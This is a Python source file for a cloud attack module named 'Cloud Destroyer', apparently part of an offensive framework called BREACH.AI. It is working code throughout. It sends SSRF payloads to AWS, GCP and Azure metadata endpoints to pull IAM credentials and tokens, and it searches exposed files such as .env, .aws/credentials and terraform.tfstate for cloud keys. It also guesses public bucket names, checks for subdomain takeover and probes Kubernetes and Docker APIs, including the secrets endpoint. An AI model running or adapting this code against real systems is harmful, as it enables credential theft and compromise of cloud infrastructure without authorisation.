"""
BREACH.AI - Cloud Destroyer

Comprehensive cloud infrastructure attack module.
Everyone's on AWS/Azure/GCP - and they're all misconfigured.

Attack Categories:
1. Cloud Metadata Exploitation - SSRF to metadata services
2. S3/Blob/GCS Bucket Attacks - Public buckets, misconfigs
3. IAM Exploitation - Role confusion, privilege escalation
4. Serverless Attacks - Lambda/Functions exploitation
5. Container Escapes - Kubernetes, Docker attacks
6. Cloud Key Leakage - Exposed credentials
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin, urlparse

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.logger import logger


@dataclass
class CloudCredential:
    """Discovered cloud credential."""
    provider: str  # aws, azure, gcp
    credential_type: str  # access_key, token, connection_string
    value: str
    location: str


@dataclass
class CloudBucket:
    """Discovered cloud storage bucket."""
    provider: str
    name: str
    url: str
    public: bool = False
    listable: bool = False
    writable: bool = False
    files_found: list[str] = field(default_factory=list)


class CloudDestroyer(BaseAttack):
    """
    CLOUD DESTROYER - Comprehensive cloud exploitation.

    Cloud infrastructure is complex and misconfigured.
    We exploit every weakness: metadata, buckets, IAM, serverless.
    """

    name = "Cloud Destroyer"
    attack_type = "cloud_attack"
    description = "Comprehensive cloud infrastructure exploitation"
    severity = Severity.CRITICAL
    owasp_category = "Cloud Security Misconfiguration"
    cwe_id = 16

    # Cloud metadata endpoints
    METADATA_ENDPOINTS = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.169.254/latest/user-data",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1.json",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
        ],
    }

    # Cloud credential patterns
    CLOUD_KEY_PATTERNS = {
        "aws_access_key": r'AKIA[0-9A-Z]{16}',
        "aws_secret_key": r'[0-9a-zA-Z/+=]{40}',
        "aws_session_token": r'FwoGZXIvYXdzE[A-Za-z0-9/+=]+',
        "gcp_api_key": r'AIza[0-9A-Za-z_-]{35}',
        "gcp_service_account": r'"type":\s*"service_account"',
        "azure_connection_string": r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+',
        "azure_sas_token": r'\?sv=\d{4}-\d{2}-\d{2}&[^"\'>\s]+sig=[^"\'>\s]+',
        "azure_client_secret": r'[a-zA-Z0-9_~.-]{34}',
    }

    # Common S3 bucket name patterns
    BUCKET_PATTERNS = [
        "{company}-backup",
        "{company}-backups",
        "{company}-data",
        "{company}-files",
        "{company}-assets",
        "{company}-static",
        "{company}-media",
        "{company}-uploads",
        "{company}-dev",
        "{company}-staging",
        "{company}-prod",
        "{company}-logs",
        "{company}-config",
        "{company}-private",
        "{company}-public",
        "{company}-internal",
    ]

    def get_payloads(self) -> list[str]:
        payloads = []
        for endpoints in self.METADATA_ENDPOINTS.values():
            payloads.extend(endpoints)
        return payloads

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if target uses cloud services."""
        response = await self.http_client.get(url)

        cloud_indicators = [
            "aws", "amazon", "s3.amazonaws",
            "azure", "blob.core.windows",
            "gcp", "google", "storage.googleapis",
            "cloud", "lambda", "serverless",
        ]

        body_lower = response.body.lower()
        headers_str = str(response.headers).lower()

        return any(ind in body_lower or ind in headers_str for ind in cloud_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive cloud attacks."""
        result = self._create_result(False, url, parameter)

        logger.info("[Cloud] Starting cloud destruction campaign...")

        # Attack 1: SSRF to Cloud Metadata
        metadata_result = await self._attack_metadata_ssrf(url)
        if metadata_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = metadata_result["endpoint"]
            result.details = f"Cloud metadata exposed: {metadata_result['provider']}"
            result.access_gained = AccessLevel.ROOT
            result.data_sample = metadata_result.get("data", "")[:500]
            result.add_evidence(
                "cloud_metadata",
                f"{metadata_result['provider']} metadata accessible via SSRF",
                metadata_result.get("data", "")[:1000]
            )
            return result

        # Attack 2: Cloud Storage Buckets
        bucket_result = await self._attack_cloud_buckets(url)
        if bucket_result:
            result.success = True
            result.severity = Severity.HIGH
            result.details = f"Cloud bucket misconfiguration: {bucket_result['type']}"
            result.add_evidence(
                "cloud_bucket",
                bucket_result["type"],
                bucket_result["details"]
            )

        # Attack 3: Cloud Credential Discovery
        cred_result = await self._attack_credential_discovery(url)
        if cred_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = cred_result["type"]
            result.details = f"Cloud credentials exposed: {cred_result['type']}"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "cloud_credentials",
                f"{cred_result['type']} credentials found",
                cred_result["value"][:50] + "..."
            )
            return result

        # Attack 4: Subdomain Takeover (Cloud)
        takeover_result = await self._attack_subdomain_takeover(url)
        if takeover_result:
            result.success = True
            result.details = f"Subdomain takeover: {takeover_result['type']}"
            result.add_evidence(
                "cloud_subdomain_takeover",
                takeover_result["type"],
                takeover_result["details"]
            )

        # Attack 5: Serverless Function Attacks
        serverless_result = await self._attack_serverless(url)
        if serverless_result:
            result.success = True
            result.details = f"Serverless vulnerability: {serverless_result['type']}"
            result.add_evidence(
                "cloud_serverless",
                serverless_result["type"],
                serverless_result["details"]
            )

        # Attack 6: Container/Kubernetes Attacks
        container_result = await self._attack_containers(url)
        if container_result:
            result.success = True
            result.details = f"Container vulnerability: {container_result['type']}"
            result.add_evidence(
                "cloud_container",
                container_result["type"],
                container_result["details"]
            )

        return result

    async def _attack_metadata_ssrf(self, url: str) -> Optional[dict]:
        """Test SSRF to cloud metadata services."""
        logger.debug("[Cloud] Testing cloud metadata SSRF...")

        # Find potential SSRF vectors
        ssrf_params = ["url", "uri", "path", "redirect", "link", "src", "href", "file", "fetch"]

        # Test via URL parameters
        for provider, endpoints in self.METADATA_ENDPOINTS.items():
            for metadata_url in endpoints:
                for param in ssrf_params:
                    test_url = f"{url}?{param}={metadata_url}"

                    try:
                        # For GCP, need special header
                        headers = {}
                        if provider == "gcp":
                            headers["Metadata-Flavor"] = "Google"

                        response = await self.http_client.get(test_url, headers=headers)

                        # Check for metadata indicators
                        if self._is_metadata_response(response.body, provider):
                            return {
                                "provider": provider.upper(),
                                "endpoint": metadata_url,
                                "data": response.body[:2000]
                            }

                    except Exception:
                        continue

        return None

    def _is_metadata_response(self, body: str, provider: str) -> bool:
        """Check if response contains cloud metadata."""
        indicators = {
            "aws": ["ami-id", "instance-id", "security-credentials", "iam"],
            "gcp": ["computeMetadata", "service-accounts", "project-id"],
            "azure": ["compute", "vmId", "subscriptionId"],
            "digitalocean": ["droplet_id", "hostname", "region"],
        }

        provider_indicators = indicators.get(provider, [])
        return any(ind in body for ind in provider_indicators)

    async def _attack_cloud_buckets(self, url: str) -> Optional[dict]:
        """Test for misconfigured cloud storage buckets."""
        logger.debug("[Cloud] Testing cloud storage buckets...")

        # Extract company name from URL
        parsed = urlparse(url)
        domain_parts = parsed.netloc.split(".")
        company_name = domain_parts[0] if domain_parts else "target"

        buckets_to_test = []

        # Generate bucket names
        for pattern in self.BUCKET_PATTERNS:
            bucket_name = pattern.format(company=company_name)
            buckets_to_test.append(bucket_name)

        # Test S3 buckets
        for bucket in buckets_to_test:
            s3_url = f"https://{bucket}.s3.amazonaws.com/"

            try:
                response = await self.http_client.get(s3_url)

                if response.status_code == 200:
                    # Bucket is publicly listable
                    if "<ListBucketResult" in response.body:
                        files = re.findall(r"<Key>([^<]+)</Key>", response.body)
                        return {
                            "type": "S3 bucket publicly listable",
                            "bucket": bucket,
                            "details": f"Bucket {bucket} is public. Files: {files[:10]}"
                        }

                # Check for write access
                if response.status_code != 403:
                    return {
                        "type": "S3 bucket potentially writable",
                        "bucket": bucket,
                        "details": f"Bucket {bucket} returned {response.status_code}"
                    }

            except Exception:
                continue

        # Test Azure blobs
        for bucket in buckets_to_test:
            azure_url = f"https://{company_name}.blob.core.windows.net/{bucket}?restype=container&comp=list"

            try:
                response = await self.http_client.get(azure_url)

                if response.status_code == 200 and "<EnumerationResults" in response.body:
                    return {
                        "type": "Azure blob container publicly listable",
                        "bucket": bucket,
                        "details": f"Container {bucket} is public"
                    }

            except Exception:
                continue

        # Test GCS buckets
        for bucket in buckets_to_test:
            gcs_url = f"https://storage.googleapis.com/{bucket}/"

            try:
                response = await self.http_client.get(gcs_url)

                if response.status_code == 200:
                    return {
                        "type": "GCS bucket publicly accessible",
                        "bucket": bucket,
                        "details": f"Bucket {bucket} is public"
                    }

            except Exception:
                continue

        return None

    async def _attack_credential_discovery(self, url: str) -> Optional[dict]:
        """Search for exposed cloud credentials."""
        logger.debug("[Cloud] Searching for cloud credentials...")

        # Check common files
        files_to_check = [
            "/.env",
            "/config.json",
            "/config.js",
            "/settings.json",
            "/.aws/credentials",
            "/credentials",
            "/secrets.json",
            "/.git/config",
            "/package.json",
            "/docker-compose.yml",
            "/terraform.tfstate",
            "/serverless.yml",
        ]

        for file_path in files_to_check:
            try:
                full_url = urljoin(url, file_path)
                response = await self.http_client.get(full_url)

                if response.status_code == 200:
                    for cred_type, pattern in self.CLOUD_KEY_PATTERNS.items():
                        match = re.search(pattern, response.body)
                        if match:
                            return {
                                "type": cred_type,
                                "value": match.group(0),
                                "location": file_path
                            }

            except Exception:
                continue

        # Check main page and JS files
        response = await self.http_client.get(url)
        for cred_type, pattern in self.CLOUD_KEY_PATTERNS.items():
            match = re.search(pattern, response.body)
            if match:
                value = match.group(0)
                # Filter out placeholders
                if not any(p in value.lower() for p in ["example", "xxx", "your", "placeholder"]):
                    return {
                        "type": cred_type,
                        "value": value,
                        "location": "main page"
                    }

        return None

    async def _attack_subdomain_takeover(self, url: str) -> Optional[dict]:
        """Check for cloud subdomain takeover vulnerabilities."""
        logger.debug("[Cloud] Testing subdomain takeover...")

        takeover_signatures = {
            "aws_s3": "NoSuchBucket",
            "aws_cloudfront": "The request could not be satisfied",
            "azure": "404 Web Site not found",
            "github": "There isn't a GitHub Pages site here",
            "heroku": "No such app",
            "shopify": "Sorry, this shop is currently unavailable",
            "tumblr": "There's nothing here",
            "wordpress": "Do you want to register",
        }

        # Check main domain and common subdomains
        parsed = urlparse(url)
        base_domain = parsed.netloc

        subdomains = [
            f"www.{base_domain}",
            f"cdn.{base_domain}",
            f"assets.{base_domain}",
            f"static.{base_domain}",
            f"api.{base_domain}",
            f"dev.{base_domain}",
            f"staging.{base_domain}",
        ]

        for subdomain in subdomains:
            try:
                test_url = f"https://{subdomain}"
                response = await self.http_client.get(test_url)

                for service, signature in takeover_signatures.items():
                    if signature in response.body:
                        return {
                            "type": f"{service} subdomain takeover",
                            "subdomain": subdomain,
                            "details": f"Subdomain {subdomain} vulnerable to {service} takeover"
                        }

            except Exception:
                continue

        return None

    async def _attack_serverless(self, url: str) -> Optional[dict]:
        """Test for serverless function vulnerabilities."""
        logger.debug("[Cloud] Testing serverless functions...")

        # Lambda/Function endpoints
        serverless_paths = [
            "/.netlify/functions/",
            "/api/",
            "/.vercel/",
            "/aws-lambda/",
            "/.functions/",
        ]

        for path in serverless_paths:
            try:
                full_url = urljoin(url, path)
                response = await self.http_client.get(full_url)

                # Check for exposed function list
                if response.status_code == 200:
                    if "functions" in response.body.lower():
                        return {
                            "type": "Serverless function listing",
                            "details": f"Functions exposed at {path}"
                        }

                # Check for verbose errors
                if "Lambda" in response.body or "Function" in response.body:
                    if "error" in response.body.lower() or "stack" in response.body.lower():
                        return {
                            "type": "Serverless error disclosure",
                            "details": f"Verbose errors at {path}"
                        }

            except Exception:
                continue

        return None

    async def _attack_containers(self, url: str) -> Optional[dict]:
        """Test for container/Kubernetes vulnerabilities."""
        logger.debug("[Cloud] Testing container vulnerabilities...")

        # Kubernetes endpoints
        k8s_paths = [
            "/api/v1/",
            "/api/v1/namespaces",
            "/api/v1/pods",
            "/api/v1/secrets",
            "/apis/",
            "/healthz",
            "/metrics",
            "/version",
        ]

        # Docker endpoints
        docker_paths = [
            "/v1.24/containers/json",
            "/v1.24/images/json",
            "/_ping",
        ]

        # Test Kubernetes API
        for path in k8s_paths:
            try:
                full_url = urljoin(url, path)
                response = await self.http_client.get(full_url)

                if response.status_code == 200:
                    if "apiVersion" in response.body or "kind" in response.body:
                        return {
                            "type": "Kubernetes API exposed",
                            "details": f"K8s API accessible at {path}"
                        }

            except Exception:
                continue

        # Test Docker API
        for path in docker_paths:
            try:
                full_url = urljoin(url, path)
                response = await self.http_client.get(full_url)

                if response.status_code == 200:
                    if "Containers" in response.body or "Docker" in response.body:
                        return {
                            "type": "Docker API exposed",
                            "details": f"Docker API accessible at {path}"
                        }

            except Exception:
                continue

        return None
